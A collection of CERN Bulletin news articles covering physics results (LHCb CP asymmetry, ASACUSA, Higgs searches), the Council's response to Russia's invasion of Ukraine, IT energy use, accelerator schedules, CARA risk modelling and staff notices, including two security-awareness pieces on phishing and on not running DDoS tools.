A 3D “street-view” recording enabled virtual visitors to explore the exhibition while accessing supplementary information at the click of a button.
For example, while wandering through the exhibition, one can “meet” Nobel Prize winner Barry Barish standing in front of a blackboard giving a 20-minute presentation on the history of gravitation and the discovery of gravitational waves in 2015.
The blackboard itself is an exhibit, having been used for more than 60 years at CERN and saved from destruction when the CERN Theory department was renovated.
The virtual exhibition is now archived and remains accessible here (science floor, art floor), where it may continue to be updated in response to new developments and discoveries.
The virtual archive is accessible from any internet-connected device and can be used at any time for education purposes and to inspire different audiences.
It is an exciting example of how modern technology, some of it born at CERN more than 30 years ago, can be used to extend the lifetime and enhance the content and geographical reach of previously localised exhibitions.
*ORIGIN is a consortium of scientific collaborations aiming to understand the origin, composition and evolution of the universe.
It supports a variety of scientific and artistic projects, focusing on cross-disciplinary engagement, networking and education on a global scale.
Current ORIGIN partners are: ALICE, ATLAS, CMS, LHCb, LIGO, VIRGO, ICEcube, Muographer, the Parameter Institute and the CLS.
ATLAS celebrates its 2021 Thesis Award winners.
Six young researchers were honoured in an online ceremony on 24 February
Every year, the ATLAS collaboration comes together to celebrate the work of its PhD students through the ATLAS Thesis Awards.
The winners of the 2021 edition were announced in an online ceremony on 24 February.

Largest matter-antimatter asymmetry observed.
New results from the LHCb experiment on CP asymmetry in charmless three-body charged B meson decays include the largest CP asymmetry ever observed
CP asymmetry is the only non-trivial difference between matter and antimatter found so far.
Its discovery in neutral kaon decays in 1964 came as a big surprise to the physics community, but today it is an essential component of the Standard Model of particle physics.
Without CP asymmetry the Big Bang would have created equal amounts of matter and antimatter, which would all have then annihilated, leaving behind an empty Universe filled with radiation.
To produce a matter-dominated Universe like the one we live in, an excess of matter must have formed and survived this annihilation.
But to produce such an excess, some difference between matter and antimatter must be present: enter CP asymmetry.
Unfortunately, the amount of CP asymmetry present in the Standard Model of particle physics is not enough to explain the observed composition of the Universe, driving extensive studies of this phenomenon and searches for other sources of CP asymmetry.
This week, at the Rencontres de Moriond Electroweak conference and during a seminar held at CERN, the LHCb collaboration presented new results from studies of CP asymmetry in charmless three-body decays of charged B mesons.
These decays involve a charged B meson, consisting of a beauty quark and an up quark, transforming into a combination of π and K mesons.  The name “charmless” refers to the absence of charm quarks in the final state: π± mesons (pions) contain only up and down quarks, and K± mesons (kaons) contain a strange and an up quark.
Charmless decays involve the transformation of a beauty quark into an up quark, which is an unlikely process, as the beauty quark predominantly decays into a charm quark.
In this rare process the effects of CP violation are expected to be enhanced.
The new LHCb results focus on “direct” CP violation: a phenomenon where the same decay process has a different probability for a particle than for an antiparticle.
The strongest global asymmetry was observed for the decay into two kaons and one pion, where the probability of a B+→π+K+K- decay is about 20% higher than for the B-→π-K+K-decay (corresponding to a measured CP asymmetry ACP of -0.114).
A global CP asymmetry has also been observed with a significance of more than five standard deviations for the first time in decays into three pions and decays into three kaons.
For the final state with two pions and one kaon, CP violation is still not confirmed.
The three-particle final state can, however, be studied further in order to extract more information.
The process of a B meson transforming into three particles can occur in several steps, with intermediate short-lived particles (“resonances”) forming and subsequently decaying into the pions and kaons seen in the final state.
These processes can make different contributions to the CP asymmetry and can be disentangled by taking into account the momenta of the final state particles in what’s known as “phase space analysis”.
One spectacular result of such an analysis is the indication of a χhc0 meson (containing a charm-anticharm quark pair) being formed during the B→πππ decay.
The χhc0 was not expected to contribute to CP violation but the results show the presence of a significant asymmetry.
In fact, the subset of data containing the χhc0 events features the highest CP asymmetry ever observed: the B- meson makes an almost 7 times greater contribution to this process than its B+counterpart, as can be seen in the plot below.
The results presented provide important clues about the mechanism of CP asymmetry generation in the Standard Model, which is not yet fully understood.
Even more detailed studies will be performed in the upcoming LHC Run 3 with the newly-upgraded LHCb detector.

ASACUSA sees surprising behaviour of hybrid matter–antimatter atoms in superfluid helium.
The result may open doors to several lines of research in particle physics and beyond
A hybrid matter­­–antimatter helium atom containing an antiproton, the proton’s antimatter equivalent, in place of an electron has an unexpected response to laser light when immersed in superfluid helium, reports the ASACUSA collaboration at CERN.
The result, described in a paper published today in the journal Nature, may open doors to several lines of research.
“Our study suggests that hybrid matter–antimatter helium atoms could be used beyond particle physics, in particular in condensed-matter physics and perhaps even in astrophysics experiments,” says ASACUSA co-spokesperson Masaki Hori.
“We have arguably made the first step in using antiprotons to study condensed matter.”
The ASACUSA collaboration is well used to making hybrid matter–antimatter helium atoms to determine the antiproton’s mass and compare it with that of the proton.
These hybrid atoms contain an antiproton and an electron around the helium nucleus (instead of two electrons around a helium nucleus) and are made by mixing antiprotons produced at CERN’s antimatter factory with a helium gas that has a low atomic density and is kept at low temperature.
Low gas densities and temperatures have played a key role in these antimatter studies, which involve measuring the response of the hybrid atoms to laser light in order to determine their light spectrum.
High gas densities and temperatures result in spectral lines, caused by transitions of the antiproton or electron between energy levels, that are too broad, or even obscured, to allow the mass of the antiproton relative to that of the electron to be determined.
This is why it came as surprise to the ASACUSA researchers that, when they used liquid helium, which has a much higher density than gaseous helium, in their new study, they saw a decrease in the width of the antiproton spectral lines.
Moreover, when they decreased the temperature of the liquid helium to values below the temperature at which the liquid becomes a superfluid, i.e. flows without any resistance, they found an abrupt further narrowing of the spectral lines.
“This behaviour was unexpected,” says Anna Sótér, who was the principal PhD student working on the experiment and is now an assistant professor at ETHZ.
“The optical response of the hybrid helium atom in superfluid helium is starkly different to that of the same hybrid atom in high-density gaseous helium, as well as that of many normal atoms in liquids or superfluids.”
The researchers think that the surprising behaviour observed is linked to the radius of the electronic orbital, i.e. the distance at which the hybrid helium atom’s electron is located.
In contrast to that of many normal atoms, the radius of the hybrid atom’s electronic orbital changes very little when laser light is shone on the atom and thus does not affect the spectral lines even when the atom is immersed in superfluid helium.
However, further studies are needed to confirm this hypothesis.
The result has several ramifications.
Firstly, researchers may create other hybrid helium atoms, such as pionic helium atoms, in superfluid helium using different antimatter and exotic particles, to study their response to laser light in detail and measure the particle masses.
Secondly, the substantial narrowing of the lines in superfluid helium suggests that hybrid helium atoms could be used to study this form of matter and potentially other condensed-matter phases.
Finally, the narrow spectral lines could in principle be used to search for cosmic antiprotons or antideuterons (a nucleus made of an antiproton and an antineutron) of particularly low velocity that hit the liquid or superfluid helium that is used to cool experiments in space or in high-altitude balloons.
However, numerous technical challenges must be overcome before the method becomes complementary to existing techniques for searching for these forms of antimatter.

Computer Security: PhishMS.
Clicking on the wrong malicious link or attachment, or disclosing your password in reply to a malicious email or on a fake and nasty CERN single sign-on page, are two major attack vectors for the evil side to infiltrate CERN.
That’s why the Computer Security team is testing you again and again with its clicking campaigns (see here, here and here).
While those were focusing on malicious messages received by email, we should not ignore other vectors, like SMSs.
SMSs, iMessages and (with greater difficulty) chat messages via apps like WhatsApp, Signal or Threema can also be used to distribute unsolicited messages containing malicious content that try to lure you into clicking on an embedded link that misdirects you to a fake login page or downloading infected software directly to your device:
Clicking on that t.ly link could lead you anywhere, and it’s hard to figure out whether the destination is harmless or dangerous to your device and password – just like with today’s very popular QR codes (“'Check me' comes before 'Scan me'”).
SMSs are a particularly interesting attack vector, as the relevant phone numbers can be enumerated, so attackers target a telephone range, like that of CERN’s +41 75 411 nnnn.
Protective counter measures are rarely effective, in particular if the emitting sender’s phone number varies or is spoofed.
So, while in messenger apps the attacker or idiot distributing malicious links must be part of your peers, group or friends, SMSs can arrive totally unsolicited.
In either case, beware!
As we have tried to instil in you with our clicking campaigns, be vigilant and suspicious when receiving unsolicited messages via SMS, iMessage, WhatsApp and the like.
Check the package: Does the message come from someone you know?  Do its contents relate to who you are, what you do, what you expect?
Or does it come as a surprise?
If it’s the latter, tame your curiosity.  Refrain from clicking.
Save your device and account from evil, and yourself from wasting time.
Don’t give PhishMSs a chance.

Homing in on the Higgs boson's interaction with the charm quark.
New ATLAS and CMS analyses place tight limits on the strength of the Higgs boson's interaction with the charm quark
Since the discovery of the Higgs boson a decade ago, the ATLAS and CMS collaborations at the Large Hadron Collider (LHC) have been hard at work trying to unlock the secrets of this special particle.
In particular, they have been investigating in detail how the Higgs boson interacts with fundamental particles such as those that make up matter, that is, quarks and leptons.
In the Standard Model of particle physics, these matter particles fall into three categories, or “generations”, of increasing mass, and the Higgs boson interacts with them with a strength that is proportional to their mass.
Any deviation from this behaviour would provide a clear indication of new phenomena.
ATLAS and CMS have previously observed the interactions of the Higgs boson with the heaviest quarks and leptons, i.e. those of the third generation, which agree with the predictions from the Standard Model within the current measurement precision.
They have also obtained the first indications that the Higgs boson interacts with a muon, a lepton of the second generation.
However, they have yet to observe it interacting with second-generation quarks.
In two recent publications, ATLAS and CMS report analyses that place tight limits on the strength of the Higgs boson's interaction with a charm quark, a second-generation quark.
ATLAS and CMS study the Higgs boson's interactions by looking at how it transforms, or “decays”, into lighter particles or how it is produced together with other particles.
In their latest studies, using data from the second run of the LHC, the two teams searched for the decay of the Higgs boson into a charm quark and its antimatter counterpart, the charm antiquark.
In the Standard Model, this decay is relatively rare, occurring only 3% of the time.
What’s more, the decay is extremely hard to spot because the two sprays, or “jets”, of particles that it generates can also be produced by other processes at far higher rates.
To more easily identify this decay, ATLAS and CMS targeted their searches at Higgs bosons produced together with a W or a Z boson decaying to electrons, muons (W, Z) or neutrinos (Z), and they used sophisticated machine-learning techniques to identify jets originating from charm quarks.
CMS also looked for high-momentum, or “boosted”, Higgs bosons that result in two charm jets collapsing into a wide jet.
The teams found no significant indication of the decay of the Higgs boson into charm quarks in the data, but their analyses set bounds on the rate at which this decay should occur when the Higgs boson is produced along with a W and Z boson.  These bounds correspond to upper limits on the interaction strength of the Higgs boson with a charm quark, of 8.5 and 5.5 times the Standard Model prediction in the case of ATLAS and CMS, respectively.
The ATLAS team went on to combine their analysis with a measurement of the Higgs boson decay into beauty quarks, demonstrating that the Higgs boson interacts more weakly with the charm quark than it does with the beauty quark.  In other words, they found that the Higgs boson interacts differently with quarks of the second and third generations, as predicted by the Standard Model.
Interestingly, the CMS study allowed the CMS researchers to observe for the first time at a hadron collider the decay of the Z boson into charm quarks, a bonus observation that resulted from a validation step in their search for the decay of the Higgs boson into charm quarks.

A new EDH document (Pre-Registration form) for the registration of external participants in an experiment.
FAP-BC-HR, in collaboration with the Users Office and the experiments, has released Pre-Registration (PREG), a new EDH document for the registration of external participants in an experiment (PARTs) (please note that this document is accessible only to team leaders and secretaries).
Pre-Registration allows team leaders and secretaries to request the registration of new PARTs who need a computing account in order to carry out remote activities.
The Users Office requested that this document be created to replace paper registration forms and thus facilitate and streamline the registration process for PARTs.
By eliminating the need for manual data entries and paper forms, PREG also serves the dual objectives of saving resources allocated to non-value-added activities and ensuring the compliance of processes with OC11 principles, thus reinforcing the protection of personal data.
For more information, visit the Pre-registration help page.

CERN Council responds to Russian invasion of Ukraine.
The 23 Member States of CERN condemn, in the strongest terms, the military invasion of Ukraine by the Russian Federation, and deplore the resulting loss of life and humanitarian impact, as well as the involvement of Belarus in this unlawful use of force against Ukraine.
Ukraine is an Associate Member State of CERN, and Ukrainian scientists are active in many of the Laboratory’s experiments and activities.
Deeply touched by the widespread and tragic consequences of the aggression, the CERN Management and personnel, as well as the scientific community in CERN’s Member States, are working to contribute to the humanitarian effort in Ukraine and to help the Ukrainian community at CERN.
The Council held an Extraordinary Session on 8 March, devoted to discussion of future interactions with Russia.
The Council decided that:
- CERN will promote initiatives to support Ukrainian collaborators and Ukrainian scientific activity in the field of high-energy physics;
- the Observer status of the Russian Federation is suspended until further notice;
- CERN will not engage in new collaborations with the Russian Federation and its institutions until further notice.
The situation will continue to be monitored carefully and the Council is ready to take any further measures, as appropriate, at its future meetings.  In addition, the CERN Management will comply with all applicable international sanctions.
The CERN Council also expresses its support to the many members of CERN’s Russian scientific community who reject this invasion.
CERN was established in the aftermath of World War II to bring nations and people together for the peaceful pursuit of science: this aggression runs against everything for which the Organization stands. CERN will continue to uphold its core values of scientific collaboration across borders as a driver for peace.
Environmental awareness: the challenges of CERN’s IT infrastructure.
CERN’s strategy for mitigating the environmental impact of the energy consumption incurred by data processing
Some 90 petabytes of data are produced each year by the LHC experiments, and a further 25 petabytes by other, non-LHC experiments.
Processing and storing these vast amounts of data makes CERN one of the most highly demanding computing environments in the research world, and the Organization’s powerful IT infrastructure reaches beyond particle physics to support many other disciplines and fields.
There are several environmental implications relating to the use of digital technologies and IT infrastructures, the main ones being the lifetime of computing equipment and infrastructure and the energy consumption related to data processing and data storage.
In general, the lifetime of an IT server at CERN is four years.
However, these lifecycles evolve all the time: only ten years ago the Data Centre hardware had a much shorter lifetime.
Since 2012 CERN has been regularly donating computing equipment that no longer meets its highly specific efficiency standards but is still more than adequate for less exacting environments.
Energy consumption related to data processing accounts for some 75% of the energy used for data centre activities at CERN, with data storage representing the rest.
The Organization’s IT department operates the CERN Data Centre on the Meyrin site, as well as a second network hub in Prévessin and two modular data centres on a temporary basis.
In 2021, CERN’s main data centre had an average power requirement of 4.14 MW for its IT load, representing the rate at which the energy was used, which resulted in a total energy consumption of about 37 GWh over the year.
This energy consumption figure includes the cooling needed for the operation of the Data Centre.
For reference, it corresponded to around 4% of CERN’s total energy consumption in 2021 (which amounted to 954 GWh).
The current CERN Data Centre building was constructed in 1972 and has housed a wide variety of equipment over the years, from mainframes to supercomputers and from commodity computing to today’s rack computing.
Teams of experts continually examine the status of the computing equipment and carefully plan optimum schedules for maintenance and upgrades, based on detailed calculations related to performance, cost and energy efficiency.
Such planning is also carried out for data storage: one of the main advantages of the tape drives used in the Data Centre for long-term storage is that they do not consume energy when not being written to or read from.
A new data centre will soon be constructed on the Prévessin site, scheduled to be operational in the second half of 2023.
Energy efficiency is a central consideration in this project, with a plan to include a heat recovery system that could be used to heat buildings on the site.
The initial available IT capacity is expected to be 4 MW, with possible upgrades anticipated at a later stage.
CERN aims for the new data centre to have a power usage effectiveness (PUE – an indicator used for measuring the energy efficiency of a data centre) superior to 1.1.
To put this in context, the global average PUE for large data centres is around 1.5, with new data centres typically achieving a PUE between 1.2 and 1.4.
Today, the Worldwide LHC Computing Grid (WLCG) consists of 170 computer centres in 42 countries.
With the CERN Data Centre at its heart, WLCG now provides 1 million computer cores and 1 exabyte of storage.
Teams across CERN and the experiments are working hard to modernise codes, finding ways to make it run more efficiently on the latest hardware, thus saving resources and energy.
The scale of this global network means that small efficiency savings in popular code can make a really big difference.
By the time the High-Luminosity LHC starts up at the end of 2028, the total computing capacity required by the experiments is expected to be 10 times greater than today.
A key focus is to establish new innovative approaches to key computing tasks, often based on machine learning and other related technologies, to help reduce the overall amount of computing resources needed and thus play a vital role in reducing energy consumption.
In 2017, the high-energy physics community produced a roadmap for HEP software and computing R&D for the 2020s that explores future software challenges.
It discusses improvements in software efficiency, scalability and performance, as well as new approaches, such as modernising code that can run more efficiently on the latest hardware to generate significant energy savings.
Building on this roadmap, WLCG and the LHC experiments have developed an HL-LHC computing strategy, the implementation of which is regularly reviewed by the LHC scientific committee (LHCC).
In January 2022, CERN’s IT department launched an impact study on energy consumption for data storage and data processing.
The aim is to get more extensive and accurate estimates across different uses and facilities, helping the department to create a more energy-efficient IT infrastructure.
The study’s results are expected later this year.
Ordering gas soon possible on EDH.
Two additional groups of items will soon be added to the CERN store on EDH: single gases (code 60) and gas mixtures (code 61)
Soon in March, it will be possible for anyone at CERN to place gas orders in the CERN store on EDH.
The procedure, previously carried out through CERN Service Portal (SNOW) tickets, is coming back to EDH with new functionality following feedback from gas users – the efforts of the FAP-BC and EN-IM teams will allow more efficient gas order placement.
In line with other ordering schemes, it will use the MAG forms available on EDH.
Requesting gas via SNOW tickets will no longer be possible, but the Gas team can still be contacted through SNOW under the Gas support and provider (BE-EA-AS) functional element, where requests for new gas references and gas points as well as incident reporting will remain unchanged.
Further processing of work orders will continue to be handled in EAM, and the requestor will still be able to use the asset code (barcode) to obtain information on the status of their work order and its delivery to the CERN site.
The asset return procedure remains the same – the procedure is available on the SNOW website.
Gas distribution points can be located on the GIS Portal (under Data -> Equipment -> Gas Points, see below) and gas codes, their descriptions, prices and lead times for delivery can be checked in the SCEMs tree presented in the CERN Catalogue under codes starting with “60” and “61”.
The catalogues in .xlsx format are still accessible on the SNOW website for those who find this format easier to navigate.
A feedback questionnaire will be sent to gas requestors in the coming weeks to collect their opinions and suggestions for further improvement.
CERN’s Horizon Europe projects off to a flying start.
The first three Horizon Europe projects with CERN participation, spanning engineering, accelerator technology and computer science, have been approved for funding
In January 2022, the European Commission announced the selection of the first three Horizon Europe projects with CERN participation.
Submitted under the Research Infrastructure programme, these projects promise new developments in transnational access to accelerator and detector research facilities, new digital twin engines, and a European Open Science Cloud.
“2021 was the first year of the new EU Framework Programme, Horizon Europe, and we have seen continued interest from CERN teams in participating in EU projects, with 29 proposals submitted so far,” explains Svetlomir Stavrev, Head of the EU Projects Management and Operational Support section at CERN.
“CERN was one of the most successful international organisations in the Horizon 2020 framework programme.
The selection of the first Horizon Europe projects gives us confidence in our success for the years to come!”
A new, synergetic network of research facilities for accelerator and detector technologies: such is the promise of the EURO-LABS project.  “The transnational access project brings together, for the first time, the three communities engaged in nuclear physics, accelerator science and technology, and detectors for high-energy physics, pioneering a super community of sub-atomic researchers,” explains Ilias Efthymiopoulos, EURO-LABS deputy scientific coordinator.
CERN will grant access to several of its facilities and will also contribute to the scientific coordination and project management of EURO-LABS.
The project brings together 31 participants from 16 countries and will start on 1 September 2022 and run for four years.
With the aim of supporting the growing number of research use cases, interTwin will build the prototype of a universal digital twin engine, a software programme that is able to virtually replicate any physical device, product or entity thanks to machine learning and software analytics.  “The project will bring together modelling and simulation experts in high-energy physics, radio astronomy, astroparticle physics, climate research and environmental monitoring,” says Maria Girone, Chief Technical Officer of CERN openlab.
CERN provides solutions in the fields of advanced artificial intelligence, complex simulation and modelling.
The project, which is being undertaken by a consortium of 28 participants from 12 countries, will begin on 1 September 2022 and run for three years.
To create an ever-more-tailored environment for researchers and improve the interoperability of their discoveries, FAIRCORE4EOSC will develop new core components for the European Open Science Cloud (EOSC).  “The project will use CERN-developed InvenioRDM and Zenodo as digital repository solutions to offer a FAIR (findable, accessible, interoperable, reusable) infrastructure for research software archival,” adds Jose Gonzalez Lopez, Digital Repositories section leader.
The project brings together a consortium of 22 partners from 10 European countries.
It will start on 1 May 2022 and run for three years.  From quantum-resistant cryptography to advanced robotics, from two-dimensional materials to extreme data mining, over twenty Horizon Europe calls have been identified by CERN’s EU Projects Office as of potential interest for the Organization.
If you are considering EU funding for your R&D projects, please do not hesitate to visit the CERN EU Projects website and contact the EU Office.

Two mystery boxes in the hands of a new pair of CERN scientists.
Will physicist Dorota Grabowska and engineer Alberto Di Meglio be able to use a combination of theory and fact to work out, without opening them, what’s inside the two boxes without opening them?
Since 2011, the Be a Scientist project has been introducing schoolchildren from Geneva, the Pays de Gex and Haute-Savoie to the scientific research process.
The children, who are aged between 8 and 12, come up with theories, collect data and use evidence to determine the contents of boxes supplied by CERN.
In June 2021, which marked the project’s tenth anniversary, the roles were reversed.
Under top secret conditions, children from the Jean de la Fontaine school in Prévessin-Moëns (France) and the Cérésole school in Petit-Lancy (Switzerland) hid various objects inside two boxes.
The challenge for CERN’s scientists was to work out the contents without opening the boxes.
After reviewing the notes left behind by Mar Capeans and Tapan Nayak, the previous duo to attempt the challenge, theoretical physicist Dorota Grabowska and aerospace engineer Alberto Di Meglio took up the inquiry at the CERN Data Centre visit point.
Although their experiments failed to produce any really concrete results, the pair made several discoveries using all five senses.
In particular, they noticed a familiar, sweet smell that reminded them of their childhoods.
What could be at the root of this Proustian remembrance of things past?
Perhaps Archana Sharma and Pieter Mattelaer will be able to find out in the next edition of the Schools Challenge!
The video is available on CDS.
Check out the voisins.cern website for regular updates on the Schools Challenge and to follow the progress of the CERN community’s investigations.
Summer work for children of Members of the Personnel: 2022 programme cancelled.
In light of the persistent uncertainty surrounding the evolution of the COVID-19 pandemic, we regret to inform Members of Personnel that the programme for Temporary summer work reserved for children of the Members of CERN Personnel for 2022 is cancelled.
Thank you for understanding.

The CERN branch of Crédit Agricole gets a facelift.
The Crédit Agricole branch located on the Prévessin site has had a makeover and is ready to welcome you in brand new offices
Did you know that Crédit Agricole has a branch at CERN?
It opened on the Prévessin site more than 40 years ago and is the only bank located on the French part of the CERN site.
The branch can be found in Building 866, next to Restaurant 3 and the post office.
Crédit Agricole launched a renovation programme in 2014 and, since 2019, has modernised all of its branches in order to bring them into compliance with the latest safety standards and improve access for people with reduced mobility.
The renovation of the CERN branch has afforded it roomier offices, a new ATM outside (in the corridor of Building 866), a more spacious and visitor-friendly reception area and improved lighting.
The branch on the Prévessin site provides the CERN community with all the day-to-day services that are traditionally offered by the major banks (loans, insurance, account management and an ATM).
Access is restricted to current and former members of the CERN personnel and the bank’s services are available to newcomers as soon as they arrive.
When an account is opened, which can be done in either euros or Swiss francs, Crédit Agricole offers preferential conditions for everyday banking – preferential exchange and lending rates and a fixed ceiling on administrative fees for loans, whatever the amount.
Branch director Fabio Bertelli says that, in line with the bank’s motto, “Acting every day in the interest of our customers and society”, its employees are “always ready to help our clientele”.
The Prévessin branch has two full-time employees, both of whom speak French and English, one employee in charge of asset management, who is present one day per week, and a director and vice-director, each of whom is present half a day per week.
The branch welcomes current and former members of the CERN personnel all year round (except during closures), from 9.00 a.m. to 12 noon Tuesdays to Fridays, from 1.30 p.m. to 5.00 p.m. on Wednesdays and Fridays and from 2.15 p.m. to 5.00 p.m. on Tuesdays and Thursdays.
ATLAS and CMS chase the invisible with the Higgs boson.
The collaborations have set stringent new bounds on the fraction of Higgs bosons transforming into invisible particles
The Higgs boson lives for an extremely short time before it transforms, or “decays”, into other particles.
It is through the detection of some of these decay products that the unique particle has first been – and continues to be – spotted in particle collisions at the Large Hadron Collider (LHC).
But what if the Higgs boson also decayed into unexpected, new particles that were invisible to the LHC detectors, such as the particles that may constitute the dark matter permeating the universe?
The ATLAS and CMS collaborations at the LHC have explored this possibility in two recent studies, setting stringent new upper bounds on the fraction of Higgs bosons decaying into invisible particles.
According to the Standard Model of particle physics, the Higgs boson decays indirectly into known invisible particles – almost massless particles called neutrinos – only 0.1% of the time.
However, if dark matter is made up of particles interacting too weakly to be detected, as suspected by many physicists, the dark-matter particle could interact with the Higgs boson and, if not too massive, allow the Higgs boson to decay into it, increasing the fraction of invisible Higgs-boson decays.
In their latest independent investigations, the ATLAS and CMS collaborations searched for invisible Higgs-boson decays in proton–proton collision data collected during the second run of the LHC.
Both teams looked for a particular type of collision event, in which a Higgs boson is produced by a process known as vector-boson fusion and then decays into invisible particles.
These vector-boson-fusion events contain additional sprays, or “jets”, of particles emitted towards either end of the particle detectors, making this mode of Higgs-boson production easier to spot than the other modes.
Together with the “missing energy” in the collision products that the invisible particles would carry away, these jets and their properties provide distinctive signatures of such invisible Higgs-boson events.
The ATLAS and CMS searches revealed no instances of these invisible Higgs-boson events that would exceed the expected number of background events mimicking the desired events.
However, they showed that the Higgs boson cannot decay into invisible particles more often than a certain percentage of time: 15% for ATLAS and 18% for CMS, compared to an expected percentage, based on Standard Model computer simulations, of 10% for both ATLAS and CMS.
These bounds align well with one another and, when interpreted in the context of dark-matter models, they translate into bounds on the interaction strength of dark-matter particles with atomic nuclei that complement those obtained from non-collider experiments searching for dark matter.
With the LHC set to restart later this year and deliver more data, ATLAS and CMS will no doubt continue to chase the invisible with the Higgs boson.

Computer Security: Vigilance and calmness.
Like during the rise of the coronavirus two years ago, malicious actors are taking advantage of the current global political situation to pursue their criminal deeds.  Phishing.  Distributing malware.  Abusing computing resources.
Exploiting this situation of fear, uncertainty and doubt (FUD) to spread misinformation, or creating incentives to make you click on the wrong message, email or QR code.
Contrary to during COVID, however, these actors are also calling for help.  Asking people to run offensive tools to help them further their deeds and interests.
On behalf of CERN, therefore, we ask you to stay exceptionally vigilant and calm.
Be exceptionally vigilant when you receive emails coming from unknown senders or containing unsolicited content.
Be careful when opening attachments or links.
The same holds true for WhatsApp/Telegram/Signal messages and links therein.  And for QR codes.
Tame your curiosity and use “STOP – THINK – DON’T CLICK” as the best mantra to avoid endangering your computer, your digital life and the functioning of CERN.
Pause when a message arrives from someone you’ve never encountered before, and remember that email senders can easily be spoofed.
Consider also the content.
Does it make sense to you?
Does it speak your language?
Does it play on your curiosity?
Or fear?
Or guilt?
Does it try to force you to open the attachment or the link?
Just STOP – THINK – DON’T CLICK and cross-check with us at
Stay calm and do not engage with the pleas of some (other) actors.
Do not follow calls to run offensive software, like those used to run distributed denial of service (DDoS) attacks against thirty-party websites.
Operating such tools on CERN equipment or the CERN network is in violation of CERN’s Computing Rules (OC5) and any deliberate and conscious operation of those tools will be followed up.
Similarly, running such tools at home might be illegal and/or make your ISP believe your computers are infected and block/throttle them.
While we in the Computer Security team are actively monitoring for any attack against our mailboxes and computing facilities, for any abuse of our computing resources, we ask you once more: be exceptionally vigilant and stay calm.
Help us to keep the Organization secure.

Launching the CERN Innovation Programme on Environmental Applications (CIPEA).
Could CERN innovation be used to tackle climate change and other environmental challenges?  The new CIPEA programme aims to find this out, taking your ideas as the starting point.
Renewable energy, clean transportation, pollution control, climate monitoring, nature protection, green science ...
Could your work at CERN and the technologies developed by your team help build a healthier and more sustainable planet?
The CERN Innovation Programme on Environmental Applications (CIPEA) is being launched to harness CERN’s innovation potential in environmental technologies.
The primary objective of the programme is to encourage you, CERN experts, to come up with ideas for environmental applications based on CERN’s technologies, know-how and facilities.
Hopefully, some of these ideas will give rise to impactful projects in collaboration with external partners.
Whether you specialise in energy-efficient cooling systems or innovative high-precision sensors, algorithms allowing more efficient computing or superconducting transmission lines that minimise power losses, your work at CERN helps develop new, disruptive technologies, sowing the seeds for our ecological transition.
Four main sectors with high impact potential and strong synergies with CERN’s technical domains of expertise have already been identified: renewable and low-carbon energy, clean transportation and future mobility, climate change and pollution control, and sustainability and green science.
On 8 March 2022, the CIPEA kick-off event will be an opportunity for you to find out about the programme and answer questions such as:
How can my work, the technologies I develop, my know-how and the facilities I work in address major environmental challenges?
How can I provide ideas for environmental applications and what type of support and resources can I expect to receive?
How can my ideas be used later by industry, other research institutes or budding start-ups to develop solutions for a more sustainable future?
Events will be organised throughout the year to inspire you and help you understand how to participate in the programme.
This series of events will culminate in a CERN Innovation Day on Environmental Applications before summer, where the collected ideas will be presented to the CERN community and management.

Pre-spring update from the accelerator complex.
Midwinter spring is its own season and the injector complex has started to shake off the relatively short but effective year-end technical stop (YETS).
On 14 February, H- ions were accelerated again to 160 MeV in Linac4 and taken in the direction of the Booster.
Beam was taken into the Booster itself ahead of schedule on Friday, 18 February.
Physics is slated to start at ISOLDE, n_TOF and the East Area on 28 March following the recommissioning of the Booster, the PS and the facilities.
Progressive commissioning of the PS and SPS will see the restart of physics at the North Area and AD-ELENA’s experiments in the last week of April.
All sectors of the LHC are now cold, following the pre-Christmas warm-up and the subsequent successful replacement of the plug-in module with the buckled RF finger in sector 2-3 during the YETS.
Some residual YETS activities are still ongoing in the tunnel, but the key was passed from the Coordination team to the LHC Operations team on 15 February.
With electrical quality assurance (ELQA) completed in all sectors bar 2-3, the focus now shifts to the extensive powering test campaign of all magnet circuits, which is now under way, with around 8000 tests planned in all.
Sector 2-3 should be ready to start its final dipole training to 6.8 TeV towards the end of March, when interleaved training and machine checkout will begin.
Commissioning of the LHC’s other accelerator systems, such as RF, collimation, beam instrumentation, beam dump and injection, transverse damper, vacuum and so on, is also under way.
In parallel, all the LHC experiments will be continuing their final preparations, with some tight deadlines still to be met.
LHC beam commissioning with 450 GeV protons is scheduled to start on 11 April, with collisions at 450 GeV per beam expected around 10 May.
Stable beams with collisions at 6.8 TeV per beam and nominal bunch population are scheduled for 15 June.
This will be followed by a staged ramp-up in the number of bunches towards the year’s target of around 2700 bunches per beam.
Following the long shutdown, electron cloud will be an issue and some sustained scrubbing is expected.
Unidentified falling objects (UFOs) – now identified – might also hinder progress as we settle into Run 3.
It's been a long stop for the LHC and the experiments and there will be some excitement, and some relief, as we finally start Run 3 proper.
The beam test of last October gave some indication that things are in good shape but there is still a way to go – the scale of the LHC enterprise should never be underestimated.
Looking further ahead, a revised long-term schedule for the LHC was approved by the CERN Council in December, based on recommendations from both the LHC Experiments Committee (LHCC) and the CERN Machine Advisory Committee (CMAC).
Run 3 will now take us through until the end of 2025, with Long Shutdown 3 (LS3) lasting for three years instead of the previously envisaged two-and-a-half.
The shift of LS3 will allow the teams to absorb the COVID-induced delays and effectively complete the construction work of the HL-LHC programme and the Phase 2 upgrades of the ATLAS and CMS experiments.
It's been a challenging two years and the progress on all fronts has been truly remarkable under the circumstances, laying the foundations for another good year in the injectors and the start of Run 3 in the LHC.
CERN’s CARA tool spawns valuable data on viral infection mechanisms.
Accurate modelling of viral infection rates in indoor settings has been presented in detail in a peer-reviewed paper co-authored by CERN experts
CERN is renowned for being the world’s largest particle physics research laboratory and its numerous applications reach beyond this core discipline, spanning a myriad of different fields and sectors.
CARA, CERN’s COVID Airborne Risk Assessment software, is a shining example of how CERN research benefits society beyond its core mission.
The tool, which assesses the risk of COVID-19 infection in enclosed spaces by modelling the concentration profile of viruses with varying parameters, was recently presented in a paper published in a special issue of the Royal society’s “Interface Focus”.
Along with the valuable data it revealed, it is already informing policymakers and space managers worldwide.
First developed in 2020 by CERN’s Health, Safety and Environment (HSE) expert Andre Henriques, the software was initially meant as a practical solution to the Organization’s office-sharing conundrums in the context of the pandemic.
By adjusting various parameters, including mask wearing, ventilation, room volume and exposure time, space managers and safety officers could assess whether the baseline measures in place ensured an acceptable risk level and were adapted to the workplace, and this in turn helped refine CERN’s general public health measures and instructions.
But the user-oriented tool soon became a wider-reaching instrument serving the fields of immunology and infectiology.
“The model we first developed was rather conservative and its accuracy, although sufficient to properly inform decision making, was hindered by the lack of relevant expertise in health science in our team.
That’s when the WHO experts came in”, explains Andre Henriques.
